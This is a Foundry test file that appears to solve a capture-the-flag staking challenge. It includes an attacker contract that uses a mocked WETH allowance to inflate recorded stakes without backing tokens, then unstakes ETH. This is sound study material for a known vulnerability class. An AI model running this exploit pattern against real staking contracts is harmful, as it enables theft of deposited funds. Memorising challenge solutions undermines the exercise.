// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/31_Stake.sol";

interface StakeI {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
}

contract MockWETH {
    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }
}

contract StakeAttacker {
    StakeI public target;
    
    constructor (address _target){
        target = StakeI(_target);
    }

    function attack() public{
        bytes4 selector = bytes4(keccak256("StakeETH()"));
        (bool success,) = address(target).call{value: 0.0011 ether}(
            abi.encodePacked(
                selector
            )
        );
        target.StakeWETH(100 ether);
    }
}

contract StakeTest is Test {
    Stake public st;
    StakeAttacker public sa;
    MockWETH public weth;
    address public hacker = address(0x1337);

    function setUp() public {
        weth = new MockWETH();
        st = new Stake(address(weth));
        sa = new StakeAttacker(address(st));
        vm.deal(address(sa), 1 ether);
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        
        sa.attack();
        
        st.StakeETH{value: 0.0011 ether}();
        st.Unstake(0.0011 ether);
        
        vm.stopPrank();
        
        assertGt(address(st).balance, 0);
        assertGt(st.totalStaked(), address(st).balance);
        assert(st.Stakers(hacker));
        assertEq(st.UserStake(hacker), 0);
    }
}